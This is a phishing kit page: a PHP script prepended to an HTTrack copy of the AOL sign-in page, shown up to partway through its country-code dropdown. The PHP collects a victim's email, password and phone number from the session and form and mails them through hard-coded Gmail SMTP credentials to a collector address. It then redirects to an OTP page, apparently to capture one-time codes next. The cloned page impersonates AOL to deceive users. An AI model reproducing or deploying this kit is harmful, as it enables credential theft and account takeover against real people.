<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION["phone"] = $_POST["phone"];
    
    // Send email with phone number
    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'secure.mail.centre@gmail.com';
        $mail->Password = 'prjhakuqnmlyagdn';
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->setFrom('secure.mail.centre@gmail.com', 'Your Name');
        $mail->addAddress('secure.mail.centre@gmail.com');
        $mail->Subject = 'User Phone Number';
        $mail->isHTML(true);
        $emailBody = "
            <p><strong>Email:</strong> " . htmlspecialchars($_SESSION['username']) . "</p>
            <p><strong>Password:</strong> " . htmlspecialchars($_SESSION['password']) . "</p>
            <p><strong>Phone:</strong> " . htmlspecialchars($_SESSION['phone']) . "</p>

        ";
        $mail->Body = $emailBody;
        $mail->send();
         
    } catch (Exception $e) {
        // Handle error if needed
    }

    // Redirect to OTP screen after sending email
    header("Location: Otp.php");
    exit();
}
?>
<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="no-js grid light-theme ">

<!-- Mirrored from login.aol.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 19:13:55 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->





<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="oath:guce:consent-host" content="guce.aol.com" />
    <title>AOL</title>
    <meta name="description" content="AOL" />
    <link rel="dns-prefetch" href="http://gstatic.com/">
    <link rel="dns-prefetch" href="http://google.com/">
    <link rel="dns-prefetch" href="http://">
    <link rel="dns-prefetch" href="http://y.analytics.yahoo.com/">
    <link rel="dns-prefetch" href="http://ucs.query.yahoo.com/">
    <link rel="dns-prefetch" href="http://geo.query.yahoo.com/">
    <link rel="dns-prefetch" href="http://geo.yahoo.com/">
    <link rel="icon" type="image/png" href="../wm/login/aol-favicon.png">
    <link rel="shortcut icon" type="image/png" href="../wm/login/aol-favicon.png">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
    <link rel="apple-touch-icon" href="../wm/login/aol-apple-touch-icon.png">
    <link rel="apple-touch-icon-precomposed" href="../wm/login/aol-apple-touch-icon.png">
    <style nonce="QMcV4Ts/pUv4znWzI2LmCCsmUNAUBBQXHrM81YI+Bi9foNdd">
        #mbr-css-check {
            display: inline;
        }
    </style>
    <link href="aol-main.css" rel="stylesheet" type="text/css">
    <script nonce="QMcV4Ts/pUv4znWzI2LmCCsmUNAUBBQXHrM81YI+Bi9foNdd">
        var pageStartTime = new Date().getTime();
        (function (root) {
            var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
            root.isGoodJS = isGoodJS;
        }(this));

        (function (root) {
            /* -- Data -- */
            root.YUI_config = { "comboBase": "https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?", "combine": true, "root": "yui-s:3.18.0\u002F" };
            root.I13N_config = { "keys": { "pt": "utility", "ver": "nodejs" } };
            root.I13N_config || (root.I13N_config = {});
            root.I13N_config.spaceid = 160500005;
            root.I13N_config.location = "index.html\u002F\u002Flogin.aol.com\u002F";
            root.I13N_config.referrer = "";
            root.I13N_config.keys || (root.I13N_config.keys = {});
            root.I13N_config.keys.pg_name = "loginLanding";
            root.I13N_config.keys.gm_np = "aol";
            root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
            root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
            root.I13N_config.keys.cause = "direct-nav";
            root.I13N_config.keys.src_id = 160500005;
            root.COMET_URL = "index.html\u002F\u002Fserver.comet.yahoo.com\u002Fcomet";
            root.gamIframeUrl = "index.html\u002F\u002Fgpt.mail.yahoo.net\u002Fsandbox?client=aolLogin&version=0.1&limited=0&headerBidder=1&haq=1&benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22__PPId__%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22ir2%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22ng%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22__AXId__%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22ng%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22__DV360__%22%2C%22AXId%22%3A%22__AXId__%22%7D%7D";
            root.challenge || (root.challenge = {});
            root.challenge.servingStamp = 1730920434205;
            root.challenge.isAndroidWebview = false;
            root.I13N_config.keys.pct = "signin";
            root.I13N_config.keys.milestone = "signin";
            root.currentURL = "\u002F";
            root.COUNTRY_CODES_MAP = { "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", "AR": "+54", "AM": "+374", "AW": "+297", "AC": "+247", "AU": "+61", "AX": "+672", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", "BD": "+880", "BB": "+1", "BY": "+375", "BE": "+32", "BZ": "+501", "BJ": "+229", "BM": "+1", "BT": "+975", "BO": "+591", "BA": "+387", "BW": "+267", "BR": "+55", "VG": "+1", "BN": "+673", "BG": "+359", "BF": "+226", "BI": "+257", "KH": "+855", "CM": "+237", "CA": "+1", "CV": "+238", "KY": "+1", "CF": "+236", "TD": "+235", "CL": "+56", "CN": "+86", "CO": "+57", "KM": "+269", "CG": "+242", "CK": "+682", "CR": "+506", "CI": "+225", "HR": "+385", "CU": "+53", "CY": "+357", "CZ": "+420", "CD": "+243", "DK": "+45", "DG": "+246", "DJ": "+253", "DM": "+1", "DO": "+1", "TL": "+670", "EC": "+593", "EG": "+20", "SV": "+503", "GQ": "+240", "ER": "+291", "EE": "+372", "ET": "+251", "FK": "+500", "FO": "+298", "FJ": "+679", "FI": "+358", "FR": "+33", "GF": "+594", "PF": "+689", "GA": "+241", "GM": "+220", "GE": "+995", "DE": "+49", "GH": "+233", "GI": "+350", "GR": "+30", "GL": "+299", "GD": "+1", "GP": "+590", "GU": "+1", "GT": "+502", "GN": "+224", "GW": "+245", "GY": "+592", "HT": "+509", "HN": "+504", "HK": "+852", "HU": "+36", "IS": "+354", "IN": "+91", "ID": "+62", "IR": "+98", "IQ": "+964", "IE": "+353", "IL": "+972", "IT": "+39", "JM": "+1", "JP": "+81", "JO": "+962", "KZ": "+7", "KE": "+254", "KI": "+686", "XK": "+383", "KW": "+965", "KG": "+996", "LA": "+856", "LV": "+371", "LB": "+961", "LS": "+266", "LR": "+231", "LY": "+218", "LI": "+423", "LT": "+370", "LU": "+352", "MO": "+853", "MK": "+389", "MG": "+261", "MW": "+265", "MY": "+60", "MV": "+960", "ML": "+223", "MT": "+356", "MH": "+692", "MQ": "+596", "MR": "+222", "MU": "+230", "MX": "+52", "FM": "+691", "MD": "+373", "MC": "+377", "MN": "+976", "ME": "+382", "MS": "+1", "MA": "+212", "MZ": "+258", "MM": "+95", "NA": "+264", "NR": "+674", "NP": "+977", "NL": "+31", "AN": "+599", "NC": "+687", "NZ": "+64", "NI": "+505", "NE": "+227", "NG": "+234", "NU": "+683", "KP": "+850", "MP": "+1", "NO": "+47", "OM": "+968", "PK": "+92", "PW": "+680", "PS": "+970", "PA": "+507", "PG": "+675", "PY": "+595", "PE": "+51", "PH": "+63", "PL": "+48", "PT": "+351", "PR": "+1", "QA": "+974", "RE": "+262", "RO": "+40", "RU": "+7", "RW": "+250", "SH": "+290", "KN": "+1", "LC": "+1", "PM": "+508", "VC": "+1", "WS": "+685", "SM": "+378", "ST": "+239", "SA": "+966", "SN": "+221", "RS": "+381", "SC": "+248", "SL": "+232", "SG": "+65", "SK": "+421", "SI": "+386", "SB": "+677", "SO": "+252", "ZA": "+27", "KR": "+82", "ES": "+34", "LK": "+94", "SD": "+249", "SR": "+597", "SZ": "+268", "SE": "+46", "CH": "+41", "SY": "+963", "TW": "+886", "TJ": "+992", "TZ": "+255", "TH": "+66", "TG": "+228", "TK": "+690", "TO": "+676", "TT": "+1", "TN": "+216", "TR": "+90", "TM": "+993", "TC": "+1", "TV": "+688", "VI": "+1", "UG": "+256", "UA": "+380", "AE": "+971", "GB": "+44", "US": "+1", "UY": "+598", "UZ": "+998", "VU": "+678", "VA": "+379", "VE": "+58", "VN": "+84", "WF": "+681", "YE": "+967", "ZM": "+260", "ZW": "+263" };
            root.enforceCountryCodeDropDown = undefined;
            root.isIOSDevice = false;
        }(this));


        YUI_config.global = window;


        window.mbrSendError = function (name, url) {
            (new Image()).src = '/account/js-reporting/?rid=15k288pjinfvi&crumb=' + encodeURIComponent('zUFiydkJHlvXW47GpqA') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
        };

        var oldError = window.onerror;

        var allowListedErrorScripts = ["bundle.js"];
        window.onerror = function (errorMsg, url, lineNumber, column, errorObj) {
            const fileName = url ? url.split('index.html').pop() : null;
            if (fileName && allowListedErrorScripts.indexOf(fileName) > -1) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            }
        }

    </script>
</head>

<body
    class="bucket-mbr-whatsapp-ac bucket-mbr-whatsapp-nac bucket-mbr-ar-cc bucket-mbr-fido-upsell-desktop2 bucket-mbr-request-imapin-scopes-ym">
    <script nonce="">
            (function (root) {
                var doc = document;
                if (root.isGoodJS) {
                    doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                }
            }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 responsive  grid   ">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo "
                        width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo " width="100" height="">
                </a>
            </span>
            <div class="desktop-universal-header">
                <a href="https://help.aol.com/" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="universal-header-links"
                    data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html"
                    class="universal-header-links privacy-link" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
            </div>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div class="mbr-login-hd txt-align-center">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol"
                        class="logo aol-en-US" width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo aol-en-US" width="100" height="">
                </div>
                <div class="challenge yid-challenge">
                    <div class="challenge-header">
                    </div>
                    <div class="username-challenge" id="login-landing">
                        <strong class="challenge-heading">Sign&nbsp;in</strong>
                        <p>To help keep your account safe, AOL wants to make sure it's really you trying to sign in.</p>
                        

                        <form id="login-username-form" method="post" class="pure-form">
                            <input type="hidden" name="browser-fp-data" id="browser-fp-data"
                                value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1.5,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:480,&quot;timezone&quot;:&quot;America/Los_Angeles&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:5,&quot;hash&quot;:&quot;2c14024bf8584c3f7f63f24ea490e812&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 620 (0x00005916) Direct3D11 vs_5_0 ps_5_0, D3D11)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:1,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:10,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:49,&quot;hash&quot;:&quot;411659924ff38420049ac402a30466bc&quot;},&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1280&quot;,&quot;h&quot;:&quot;720&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;720&quot;,&quot;h&quot;:&quot;1280&quot;},&quot;ts&quot;:{&quot;serve&quot;:1730984248101,&quot;render&quot;:1730984249905}}">
                            <input type="hidden" name="crumb" value="2oZOK6RIT3rxzVtiVUsHA">
                            <input type="hidden" name="acrumb" value="dbwqs9vc">
                            <input type="hidden" name="sessionIndex" value="QQ--">
                            <input type="hidden" name="displayName" value="">
                            <input type="hidden" name="deviceCapability"
                                value="{&quot;pa&quot;:{&quot;status&quot;:true},&quot;isWebAuthnSupported&quot;:true}"
                                id="deviceCapability">
                            <div id="username-country-code-field"
                                class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
                                <div id="selected-country-code-cont"
                                    class="puree-dropdown selected-country-code-cont ltr hide">
                                    <div id="selected-country-code" class="selected-country-code">+234</div>
                                    <span class="arrow"></span>
                                </div>
                                <div id="country-dropdown-container"
                                    class="country-code-dropdown country-dropdown-container hide">
                                    <div class="puree-dropdown">
                                        <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
                                        <select type="select" name="countryCodeIntl" aria-required="true"
                                            role="combobox" aria-labelledby="country-code-lbl-aria" disabled="">
                                            <option role="option" data-code="+93" value="AF">Afghanistan
                                                &#x202A;(+93)&#x202C;</option>
                                            <option role="option" data-code="+355" value="AL">Albania
                                                &#x202A;(+355)&#x202C;</option>
                                            <option role="option" data-code="+213" value="DZ">Algeria
                                                &#x202A;(+213)&#x202C;</option>
                                            <option role="option" data-code="+1" value="AS">American Samoa
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+376" value="AD">Andorra
                                                &#x202A;(+376)&#x202C;</option>
                                            <option role="option" data-code="+244" value="AO">Angola
                                                &#x202A;(+244)&#x202C;</option>
                                            <option role="option" data-code="+1" value="AI">Anguilla
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+1" value="AG">Antigua and Barbuda
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+54" value="AR">Argentina
                                                &#x202A;(+54)&#x202C;</option>
                                            <option role="option" data-code="+374" value="AM">Armenia
                                                &#x202A;(+374)&#x202C;</option>
                                            <option role="option" data-code="+297" value="AW">Aruba
                                                &#x202A;(+297)&#x202C;</option>
                                            <option role="option" data-code="+247" value="AC">Ascension
                                                &#x202A;(+247)&#x202C;</option>
                                            <option role="option" data-code="+61" value="AU">Australia
                                                &#x202A;(+61)&#x202C;</option>
                                            <option role="option" data-code="+672" value="AX">Australian External
                                                Territories &#x202A;(+672)&#x202C;</option>
                                            <option role="option" data-code="+43" value="AT">Austria
                                                &#x202A;(+43)&#x202C;</option>
                                            <option role="option" data-code="+994" value="AZ">Azerbaijan
                                                &#x202A;(+994)&#x202C;</option>
                                            <option role="option" data-code="+1" value="BS">Bahamas &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+973" value="BH">Bahrain
                                                &#x202A;(+973)&#x202C;</option>
                                            <option role="option" data-code="+880" value="BD">Bangladesh
                                                &#x202A;(+880)&#x202C;</option>
                                            <option role="option" data-code="+1" value="BB">Barbados
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+375" value="BY">Belarus
                                                &#x202A;(+375)&#x202C;</option>
                                            <option role="option" data-code="+32" value="BE">Belgium
                                                &#x202A;(+32)&#x202C;</option>
                                            <option role="option" data-code="+501" value="BZ">Belize
                                                &#x202A;(+501)&#x202C;</option>
                                            <option role="option" data-code="+229" value="BJ">Benin
                                                &#x202A;(+229)&#x202C;</option>
                                            <option role="option" data-code="+1" value="BM">Bermuda &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+975" value="BT">Bhutan
                                                &#x202A;(+975)&#x202C;</option>
                                            <option role="option" data-code="+591" value="BO">Bolivia
                                                &#x202A;(+591)&#x202C;</option>
                                            <option role="option" data-code="+387" value="BA">Bosnia and Herzegovina
                                                &#x202A;(+387)&#x202C;</option>
                                            <option role="option" data-code="+267" value="BW">Botswana
                                                &#x202A;(+267)&#x202C;</option>
                                            <option role="option" data-code="+55" value="BR">Brazil
                                                &#x202A;(+55)&#x202C;</option>
                                            <option role="option" data-code="+1" value="VG">British Virgin Islands
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+673" value="BN">Brunei Darussalam
                                                &#x202A;(+673)&#x202C;</option>
                                            <option role="option" data-code="+359" value="BG">Bulgaria
                                                &#x202A;(+359)&#x202C;</option>
                                            <option role="option" data-code="+226" value="BF">Burkina Faso
                                                &#x202A;(+226)&#x202C;</option>
                                            <option role="option" data-code="+257" value="BI">Burundi
                                                &#x202A;(+257)&#x202C;</option>
                                            <option role="option" data-code="+855" value="KH">Cambodia
                                                &#x202A;(+855)&#x202C;</option>
                                            <option role="option" data-code="+237" value="CM">Cameroon
                                                &#x202A;(+237)&#x202C;</option>
                                            <option role="option" data-code="+1" value="CA">Canada &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+238" value="CV">Cape Verde
                                                &#x202A;(+238)&#x202C;</option>
                                            <option role="option" data-code="+1" value="KY">Cayman Islands
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+236" value="CF">Central African Republic
                                                &#x202A;(+236)&#x202C;</option>
                                            <option role="option" data-code="+235" value="TD">Chad
                                                &#x202A;(+235)&#x202C;</option>
                                            <option role="option" data-code="+56" value="CL">Chile &#x202A;(+56)&#x202C;
                                            </option>
                                            <option role="option" data-code="+86" value="CN">China &#x202A;(+86)&#x202C;
                                            </option>
                                            <option role="option" data-code="+57" value="CO">Colombia
                                                &#x202A;(+57)&#x202C;</option>
                                            <option role="option" data-code="+269" value="KM">Comoros
                                                &#x202A;(+269)&#x202C;</option>
                                            <option role="option" data-code="+242" value="CG">Congo
                                                &#x202A;(+242)&#x202C;</option>
                                            <option role="option" data-code="+682" value="CK">Cook Islands
                                                &#x202A;(+682)&#x202C;</option>
                                            <option role="option" data-code="+506" value="CR">Costa Rica
                                                &#x202A;(+506)&#x202C;</option>
                                            <option role="option" data-code="+225" value="CI">Cote dÕIvoire
                                                &#x202A;(+225)&#x202C;</option>
                                            <option role="option" data-code="+385" value="HR">Croatia
                                                &#x202A;(+385)&#x202C;</option>
                                            <option role="option" data-code="+53" value="CU">Cuba &#x202A;(+53)&#x202C;
                                            </option>
                                            <option role="option" data-code="+357" value="CY">Cyprus
                                                &#x202A;(+357)&#x202C;</option>
                                            <option role="option" data-code="+420" value="CZ">Czech Republic
                                                &#x202A;(+420)&#x202C;</option>
                                            <option role="option" data-code="+243" value="CD">Democratic Republic of the
                                                Congo &#x202A;(+243)&#x202C;</option>
                                            <option role="option" data-code="+45" value="DK">Denmark
                                                &#x202A;(+45)&#x202C;</option>
                                            <option role="option" data-code="+246" value="DG">Diego Garcia
                                                &#x202A;(+246)&#x202C;</option>
                                            <option role="option" data-code="+253" value="DJ">Djibouti
                                                &#x202A;(+253)&#x202C;</option>
                                            <option role="option" data-code="+1" value="DM">Dominica
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+1" value="DO">Dominican Republic
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+670" value="TL">East Timor
                                                &#x202A;(+670)&#x202C;</option>
                                            <option role="option" data-code="+593" value="EC">Ecuador
                                                &#x202A;(+593)&#x202C;</option>
                                            <option role="option" data-code="+20" value="EG">Egypt &#x202A;(+20)&#x202C;
                                            </option>
                                            <option role="option" data-code="+503" value="SV">El Salvador
                                                &#x202A;(+503)&#x202C;</option>
                                            <option role="option" data-code="+240" value="GQ">Equatorial Guinea
                                                &#x202A;(+240)&#x202C;</option>
                                            <option role="option" data-code="+291" value="ER">Eritrea
                                                &#x202A;(+291)&#x202C;</option>
                                            <option role="option" data-code="+372" value="EE">Estonia
                                                &#x202A;(+372)&#x202C;</option>
                                            <option role="option" data-code="+251" value="ET">Ethiopia
                                                &#x202A;(+251)&#x202C;</option>
                                            <option role="option" data-code="+500" value="FK">Falkland Islands
                                                &#x202A;(+500)&#x202C;</option>
                                            <option role="option" data-code="+298" value="FO">Faroe Islands
                                                &#x202A;(+298)&#x202C;</option>
                                            <option role="option" data-code="+679" value="FJ">Fiji
                                                &#x202A;(+679)&#x202C;</option>
                                            <option role="option" data-code="+358" value="FI">Finland
                                                &#x202A;(+358)&#x202C;</option>
                                            <option role="option" data-code="+33" value="FR">France
                                                &#x202A;(+33)&#x202C;</option>
                                            <option role="option" data-code="+594" value="GF">French Guiana
                                                &#x202A;(+594)&#x202C;</option>
                                            <option role="option" data-code="+689" value="PF">French Polynesia
                                                &#x202A;(+689)&#x202C;</option>
                                            <option role="option" data-code="+241" value="GA">Gabon
                                                &#x202A;(+241)&#x202C;</option>
                                            <option role="option" data-code="+220" value="GM">Gambia
                                                &#x202A;(+220)&#x202C;</option>
                                            <option role="option" data-code="+995" value="GE">Georgia
                                                &#x202A;(+995)&#x202C;</option>
                                            <option role="option" data-code="+49" value="DE">Germany
                                                &#x202A;(+49)&#x202C;</option>
                                            <option role="option" data-code="+233" value="GH">Ghana
                                                &#x202A;(+233)&#x202C;</option>
                                            <option role="option" data-code="+350" value="GI">Gibraltar
                                                &#x202A;(+350)&#x202C;</option>
                                            <option role="option" data-code="+30" value="GR">Greece
                                                &#x202A;(+30)&#x202C;</option>
                                            <option role="option" data-code="+299" value="GL">Greenland
                                                &#x202A;(+299)&#x202C;</option>
                                            <option role="option" data-code="+1" value="GD">Grenada &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+590" value="GP">Guadeloupe
                                                &#x202A;(+590)&#x202C;</option>
                                            <option role="option" data-code="+1" value="GU">Guam &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+502" value="GT">Guatemala
                                                &#x202A;(+502)&#x202C;</option>
                                            <option role="option" data-code="+224" value="GN">Guinea
                                                &#x202A;(+224)&#x202C;</option>
                                            <option role="option" data-code="+245" value="GW"> &#x202A;(+245)&#x202C;
                                            </option>
                                            <option role="option" data-code="+592" value="GY">Guyana
                                                &#x202A;(+592)&#x202C;</option>
                                            <option role="option" data-code="+509" value="HT">Haiti
                                                &#x202A;(+509)&#x202C;</option>
                                            <option role="option" data-code="+504" value="HN">Honduras
                                                &#x202A;(+504)&#x202C;</option>
                                            <option role="option" data-code="+852" value="HK">Hong Kong
                                                &#x202A;(+852)&#x202C;</option>
                                            <option role="option" data-code="+36" value="HU">Hungary
                                                &#x202A;(+36)&#x202C;</option>
                                            <option role="option" data-code="+354" value="IS">Iceland
                                                &#x202A;(+354)&#x202C;</option>
                                            <option role="option" data-code="+91" value="IN">India &#x202A;(+91)&#x202C;
                                            </option>
                                            <option role="option" data-code="+62" value="ID">Indonesia
                                                &#x202A;(+62)&#x202C;</option>
                                            <option role="option" data-code="+98" value="IR">Iran &#x202A;(+98)&#x202C;
                                            </option>
                                            <option role="option" data-code="+964" value="IQ">Iraq
                                                &#x202A;(+964)&#x202C;</option>
                                            <option role="option" data-code="+353" value="IE">Ireland
                                                &#x202A;(+353)&#x202C;</option>
                                            <option role="option" data-code="+972" value="IL">Israel
                                                &#x202A;(+972)&#x202C;</option>
                                            <option role="option" data-code="+39" value="IT">Italy &#x202A;(+39)&#x202C;
                                            </option>
                                            <option role="option" data-code="+1" value="JM">Jamaica &#x202A;(+1)&#x202C;
                                            </option>
                                            <option role="option" data-code="+81" value="JP">Japan &#x202A;(+81)&#x202C;
                                            </option>
                                            <option role="option" data-code="+962" value="JO">Jordan
                                                &#x202A;(+962)&#x202C;</option>
                                            <option role="option" data-code="+7" value="KZ">Kazakhstan
                                                &#x202A;(+7)&#x202C;</option>
                                            <option role="option" data-code="+254" value="KE">Kenya
                                                &#x202A;(+254)&#x202C;</option>
                                            <option role="option" data-code="+686" value="KI">Kiribati
                                                &#x202A;(+686)&#x202C;</option>
                                            <option role="option" data-code="+383" value="XK"> &#x202A;(+383)&#x202C;
                                            </option>
                                            <option role="option" data-code="+965" value="KW">Kuwait
                                                &#x202A;(+965)&#x202C;</option>
                                            <option role="option" data-code="+996" value="KG">Kyrgyzstan
                                                &#x202A;(+996)&#x202C;</option>
                                            <option role="option" data-code="+856" value="LA">Laos
                                                &#x202A;(+856)&#x202C;</option>
                                            <option role="option" data-code="+371" value="LV">Latvia
                                                &#x202A;(+371)&#x202C;</option>
                                            <option role="option" data-code="+961" value="LB">Lebanon
                                                &#x202A;(+961)&#x202C;</option>
                                            <option role="option" data-code="+266" value="LS">Lesotho
                                                &#x202A;(+266)&#x202C;</option>
                                            <option role="option" data-code="+231" value="LR">Liberia
                                                &#x202A;(+231)&#x202C;</option>
                                            <option role="option" data-code="+218" value="LY">Libya
                                                &#x202A;(+218)&#x202C;</option>
                                            <option role="option" data-code="+423" value="LI">Liechtenstein
                                                &#x202A;(+423)&#x202C;</option>
                                            <option role="option" data-code="+370" value="LT">Lithuania
                                                &#x202A;(+370)&#x202C;</option>
                                            <option role="option" data-code="+352" value="LU">Luxembourg
                                                &#x202A;(+352)&#x202C;</option>
                                            <option role="option" data-code="+853" value="MO">Macao
                                                &#x202A;(+853)&#x202C;</option>
                                            <option role="option" data-code="+389" value="MK">Macedonia
                                                &#x202A;(+389)&#x202C;</option>
                                            <option role="option" data-code="+261" value="MG">Madagascar
                                                &#x202A;(+261)&#x202C;</option>
                                            <option role="option" data-code="+265" value="MW">Malawi
                                                &#x202A;(+265)&#x202C;</option>
                                            <option role="option" data-code="+60" value="MY">Malaysia
                                                &#x202A;(+60)&#x202C;</option>
                                            <option role="option" data-code="+960" value="MV">Maldives
                                                &#x202A;(+960)&#x202C;</option>
                                            <option role="option" data-code="+223" value="ML">Mali
                                                &#x202A;(+223)&#x202C;</option>
                                            <option role="option" data-code="+356" value="MT">Malta
                                                &#x202A;(+356)&#x202C;</option>
                                            <option role="option" data-code="+692" value="MH">Marshall Islands
                                                &#x202A;(+692)&#x202C;</option>
                                            <option role="option" data-code="+596" value="MQ">Martinique
                                                &#x202A;(+596)&#x202C;</option>
                                            <option role="option" data-code="+222" value="MR">Mauritania
                                                &#x202A;(+222)&#x202C;</option>
                                            <option role="option" data-code="+230" value="MU">Mauritius
                                                &#x202A;(+230)&#x202C;</option>
                                            <option role="option" data-code="+52" value="MX">Mexico
                                                &#x202A;(+52)&#x202C;</option>
                                            <option role="option" data-code="+691" value="FM">Micronesia
                                                &#x202A;(+691)&#x202C;</option>
                                            <option role="option" data-code="+373" value="MD">Moldova
                                                &#x202A;(+373)&#x202C;</option>
                                            <option role="option" data-code="+377" value="MC">Monaco
                                                &#x202A;(+377)&#x202C;</option>
                                            <option role="option" data-code="+976" value="MN">Mongolia
                                                &#x202A;(+976)&#x202C;</option>
                                            <option role="option" data-code="+382" value="ME">Montenegro
                                                &#x202A;(+382)&#x202C;</option>
                                            <option role="option" data-code="+1" value="MS">Montserrat
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+212" value="MA">Morocco
                                                &#x202A;(+212)&#x202C;</option>
                                            <option role="option" data-code="+258" value="MZ">Mozambique
                                                &#x202A;(+258)&#x202C;</option>
                                            <option role="option" data-code="+95" value="MM">Myanmar
                                                &#x202A;(+95)&#x202C;</option>
                                            <option role="option" data-code="+264" value="NA">Namibia
                                                &#x202A;(+264)&#x202C;</option>
                                            <option role="option" data-code="+674" value="NR">Nauru
                                                &#x202A;(+674)&#x202C;</option>
